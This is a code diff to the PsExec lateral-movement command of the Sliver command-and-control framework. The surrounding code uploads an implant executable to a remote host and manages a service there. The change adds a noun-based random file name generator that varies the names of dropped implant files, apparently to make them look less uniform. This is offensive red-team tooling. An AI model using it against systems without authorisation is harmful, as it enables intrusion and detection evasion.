@@ -21,10 +21,11 @@ package exec
 import (
 	"context"
 	"fmt"
-	"io/ioutil"
-	insecureRand "math/rand"
+	"os"
 	"strings"
 	"time"
+
+	insecureRand "math/rand"
 
 	"github.com/bishopfox/sliver/client/command/generate"
 	"github.com/bishopfox/sliver/client/command/settings"
@@ -32,6 +33,7 @@ import (
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/server/codenames"
 	"github.com/bishopfox/sliver/util/encoders"
 	"github.com/desertbit/grumble"
 )
@@ -93,7 +95,7 @@ func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 		serviceBinary, _ = generate.GetSliverBinary(implantProfile, con)
 	} else {
 		// use a custom exe instead of generating a new Sliver
-		fileBytes, err := ioutil.ReadFile(customExe)
+		fileBytes, err := os.ReadFile(customExe)
 		if err != nil {
 			con.PrintErrorf("Error reading custom executable '%s'\n", customExe)
 			return
@@ -101,7 +103,7 @@ func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 		serviceBinary = fileBytes
 	}
 
-	filename := randomString(10)
+	filename := randomFileName()
 	filePath := fmt.Sprintf("%s\\%s.exe", uploadPath, filename)
 	uploadGzip := new(encoders.Gzip).Encode(serviceBinary)
 	// upload to remote target
@@ -172,11 +174,28 @@ func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 	con.PrintInfof("Successfully removed service %s on %s\n", serviceName, hostname)
 }
 
-func randomString(length int) string {
-	var charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-	b := make([]byte, length)
-	for i := range b {
-		b[i] = charset[insecureRand.Intn(len(charset))]
+func randomFileName() string {
+	noun, _ := codenames.RandomNoun()
+	noun = strings.ToLower(noun)
+	switch insecureRand.Intn(3) {
+	case 0:
+		noun = strings.ToUpper(noun)
+	case 1:
+		noun = strings.ToTitle(noun)
 	}
-	return string(b)
+
+	separators := []string{"", "", "", "", "", ".", "-", "_", "--", "__"}
+	sep := separators[insecureRand.Intn(len(separators))]
+
+	alphanumeric := "abcdefghijklmnopqrstuvwxyz0123456789"
+	prefix := ""
+	for index := 0; index < insecureRand.Intn(3); index++ {
+		prefix += string(alphanumeric[insecureRand.Intn(len(alphanumeric))])
+	}
+	suffix := ""
+	for index := 0; index < insecureRand.Intn(6)+1; index++ {
+		suffix += string(alphanumeric[insecureRand.Intn(len(alphanumeric))])
+	}
+
+	return fmt.Sprintf("%s%s%s%s%s", prefix, sep, noun, sep, suffix)
 }
